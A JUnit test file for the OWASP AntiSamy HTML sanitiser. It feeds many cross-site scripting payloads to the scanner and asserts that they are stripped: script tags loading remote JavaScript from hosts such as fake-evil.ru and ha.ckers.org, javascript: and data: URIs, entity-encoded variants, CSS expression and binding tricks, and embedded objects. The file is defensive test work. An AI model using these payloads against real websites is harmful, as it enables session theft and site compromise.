package org.owasp.validator.html.test;

import java.util.Arrays;
import java.util.Locale;

import org.owasp.validator.html.AntiSamy;
import org.owasp.validator.html.Policy;


import junit.framework.Test;
import junit.framework.TestCase;
import junit.framework.TestSuite;

import org.apache.commons.codec.binary.Base64;
import org.owasp.validator.html.AntiSamy;
import org.owasp.validator.html.Policy;
import org.owasp.validator.html.ScanException;

/**
 * This class tests AntiSamy functionality and the basic policy file which should be immune to XSS and 
 * CSS phishing attacks.
 * 
 * @author Arshan Dabirsiaghi
 *
 */

public class AntiSamyTest extends TestCase {

        private static final String[] BASE64_BAD_XML_STRINGS = new String[] {
            // first string is "<a - href=\"http://www.owasp.org\">click here</a>"
            "PGEgLSBocmVmPSJodHRwOi8vd3d3Lm93YXNwLm9yZyI+Y2xpY2sgaGVyZTwvYT4=",
            // the rest are randomly generated 300 byte sequences which generate parser errors, turned into Strings
            "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",
        };
        
	private AntiSamy as = new AntiSamy();
	private Policy policy = null;
	
	public AntiSamyTest (String s) { super(s); }
	
	protected void setUp() throws Exception {
		
		/*
		 * Load the policy. You may have to change the path to find the Policy file.
		 */

		policy = Policy.getInstance("resources/antisamy.xml");
		//policy = Policy.getInstance("/Users/joni/Scratch/antisamy/policy/antisamy-1.1.1.xml");
		
		System.out.println(as.scan("<img alt=\"\" src=\"http://profileflirts.com/pics/awareness/troops/0001.$%20,@+gif\" />", policy).getCleanHTML());
                
	}
	
	protected void tearDown() throws Exception { }
	
	public static Test suite() {
		
		TestSuite suite = new TestSuite(AntiSamyTest.class);
		return suite;
		
	}
	
	
	/*
	 * Test basic XSS cases. 
	 */
	
	public void testScriptAttacks() {

		try {

			assertTrue ( as.scan("test<script>alert(document.cookie)</script>",policy).getCleanHTML().indexOf("script") ==  -1);
			assertTrue ( as.scan("<<<><<script src=http://fake-evil.ru/test.js>",policy).getCleanHTML().indexOf("<script") == -1 );
			assertTrue ( as.scan("<script<script src=http://fake-evil.ru/test.js>>",policy).getCleanHTML().indexOf("<script") == -1 );
			
			assertTrue ( as.scan("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",policy).getCleanHTML().indexOf("<script") == -1 );
			assertTrue ( as.scan("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",policy).getCleanHTML().indexOf("onload") == -1 );
			assertTrue ( as.scan("<BODY ONLOAD=alert('XSS')>",policy).getCleanHTML().indexOf("alert") == -1 );

			assertTrue ( as.scan("<iframe src=http://ha.ckers.org/scriptlet.html <",policy).getCleanHTML().indexOf("<iframe") == -1 );
			assertTrue ( as.scan("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",policy).getCleanHTML().indexOf("src") == -1 );
			
		} catch (Exception e) {
			fail("Caught exception in testScriptAttack(): "+e.getMessage());
		}
		
	}
	
	public void testImgAttacks() {
		
		try {
		
			assertTrue ( as.scan("<img src='http://www.myspace.com/img.gif'>",policy).getCleanHTML().indexOf("<img") != -1);
			assertTrue ( as.scan("<img src=javascript:alert(document.cookie)>",policy).getCleanHTML().indexOf("<img") == -1);
			assertTrue ( as.scan("<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",policy).getCleanHTML().indexOf("<img") == -1 );
			assertTrue ( as.scan("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",policy).getCleanHTML().indexOf("&amp;") != -1 );
			assertTrue ( as.scan("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",policy).getCleanHTML().indexOf("&amp;") != -1 );
			assertTrue ( as.scan("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",policy).getCleanHTML().indexOf("alert") == -1 );
			assertTrue ( as.scan("<IMG SRC=\"javascript:alert('XSS')\"",policy).getCleanHTML().indexOf("javascript") == -1 );
			assertTrue ( as.scan("<IMG LOWSRC=\"javascript:alert('XSS')\">",policy).getCleanHTML().indexOf("javascript") == -1 );
			assertTrue ( as.scan("<BGSOUND SRC=\"javascript:alert('XSS');\">",policy).getCleanHTML().indexOf("javascript") == -1 );
			
			
		} catch(Exception e) {
			fail("Caught exception in testImgSrcAttacks(): "+e.getMessage());
		}
	}
	
	
	public void testHrefAttacks() {
		
		try {	
			
			assertTrue ( as.scan("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",policy).getCleanHTML().indexOf("href") == -1 );
			assertTrue ( as.scan("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">",policy).getCleanHTML().indexOf("href") == -1 );
			assertTrue ( as.scan("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>",policy).getCleanHTML().indexOf("ha.ckers.org") == -1 );
			assertTrue ( as.scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>",policy).getCleanHTML().indexOf("ha.ckers.org") == -1 );
			
			assertTrue ( as.scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>",policy).getCleanHTML().indexOf("xss.htc") == -1 );
			
			assertTrue ( as.scan("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS",policy).getCleanHTML().indexOf("javascript") == -1 );
			
			
			assertTrue ( as.scan("<IMG SRC='vbscript:msgbox(\"XSS\")'>",policy).getCleanHTML().indexOf("vbscript") == -1 );
			
			try {
				assertTrue ( as.scan("<a . href=\"http://www.test.com\">",policy).getCleanHTML().indexOf("href") != -1 );
			} catch (Exception e) {
				e.printStackTrace();
				fail("Couldn't parse malformed HTML: " + e.getMessage());
			}
			
			try {
				assertTrue ( as.scan("<a - href=\"http://www.test.com\">",policy).getCleanHTML().indexOf("href") != -1 );
			} catch (Exception e) {
				fail("Couldn't parse malformed HTML: " + e.getMessage());
			}
			
			try {
				assertTrue ( as.scan("<style>",policy) != null );
			} catch (Exception e) {
				e.printStackTrace();
				fail("Couldn't parse malformed HTML: " + e.getMessage());
			}
			
			assertTrue ( as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",policy).getCleanHTML().indexOf("<meta") == -1 );


			assertTrue ( as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", policy).getCleanHTML().indexOf("<meta") == -1 );
			assertTrue ( as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", policy).getCleanHTML().indexOf("<meta") == -1 );
			assertTrue ( as.scan("<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", policy).getCleanHTML().indexOf("iframe") == -1 );
			assertTrue ( as.scan("<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", policy).getCleanHTML().indexOf("javascript") == -1 );
			assertTrue ( as.scan("<TABLE BACKGROUND=\"javascript:alert('XSS')\">", policy).getCleanHTML().indexOf("background") == -1 );
			assertTrue ( as.scan("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", policy).getCleanHTML().indexOf("background") == -1 );
			assertTrue ( as.scan("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", policy).getCleanHTML().indexOf("javascript") == -1 );
			assertTrue ( as.scan("<DIV STYLE=\"width: expression(alert('XSS'));\">", policy).getCleanHTML().indexOf("alert") == -1 );
			assertTrue ( as.scan("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", policy).getCleanHTML().indexOf("alert") == -1 );
			assertTrue ( as.scan("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", policy).getCleanHTML().indexOf("ript:alert") == -1 );
			assertTrue ( as.scan("<BASE HREF=\"javascript:alert('XSS');//\">", policy).getCleanHTML().indexOf("javascript") == -1 );
			assertTrue ( as.scan("<BaSe hReF=\"http://arbitrary.com/\">", policy).getCleanHTML().indexOf("<base") == -1 );
			
			assertTrue ( as.scan("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", policy).getCleanHTML().indexOf("<object") == -1 );
			assertTrue ( as.scan("<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", policy).getCleanHTML().indexOf("<object") == -1 );
			assertTrue ( as.scan("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", policy).getCleanHTML().indexOf("<embed") == -1 );
			assertTrue ( as.scan("<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>", policy).getCleanHTML().indexOf("<embed") == -1 );
			
			assertTrue ( as.scan("<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("<script") == -1 );
			assertTrue ( as.scan("<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("<script") == -1 );

			assertTrue ( as.scan("<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("<script") == -1 );
			assertTrue ( as.scan("<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("<script") == -1 );
			assertTrue ( as.scan("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("script") == -1 );
			assertTrue ( as.scan("<SCRIPT SRC=http://ha.ckers.org/xss.js",policy).getCleanHTML().indexOf("<script") == -1 );
			
			assertTrue ( as.scan("<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>", policy).getCleanHTML().indexOf("style") == -1 );
			
			assertTrue ( as.scan("<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>",policy).getCleanHTML().indexOf("aim.exe") == -1 );
			assertTrue ( as.scan("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->",policy).getCleanHTML().indexOf("javascript") == -1 );
			assertTrue ( as.scan("<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">",policy).getCleanHTML().indexOf("document") == -1 );
						
		} catch(Exception e) {
			fail("Caught exception in testHrefSrcAttacks(): "+e.getMessage());
		}
	}
	
	/*
	 * Test CSS protections. 
	 */
	
	public void testCssAttacks() {
	    try {
			assertTrue ( as.scan("<div style=\"position:absolute\">",policy).getCleanHTML().indexOf("position") == -1 );
			assertTrue ( as.scan("<style>b { position:absolute }</style>",policy).getCleanHTML().indexOf("position") == -1 );
			assertTrue ( as.scan("<div style=\"z-index:25\">",policy).getCleanHTML().indexOf("position") == -1 );
			assertTrue ( as.scan("<style>z-index:25</style>",policy).getCleanHTML().indexOf("position") == -1 );
			assertTrue ( as.scan("<div style=\"font-family: Geneva, Arial, courier new, sans-serif\">",policy).getCleanHTML().indexOf("font-family") > -1 );			
	    } catch (Exception e) {
	    	fail("Caught exception in testCssAttacks(): "+e.getMessage());		
	    }
	}
        
    public void testIllegalXML() {
       
    	try {
    		as.scan("<a onblur=\"alert(secret)\" href=\"http://www.google.com\">Google</a>",policy);
    	} catch (Throwable t) {
    		t.printStackTrace();
    		fail("Caught exception in testIllegalXML(): "+t.getMessage());
    	}
    	
    	for (int i = 0; i < BASE64_BAD_XML_STRINGS.length; i++) {
            
        	try {
                
            	String testStr = new String(Base64.decodeBase64(BASE64_BAD_XML_STRINGS[i].getBytes()));
                as.scan(testStr, policy);
                
            } catch (ScanException ex) {
                // still success
            	
            } catch (Throwable ex) {
            	ex.printStackTrace();
                fail("Caught unexpected exception in testIllegalXML(): " + ex.getMessage());
            }
        }
    }
        
}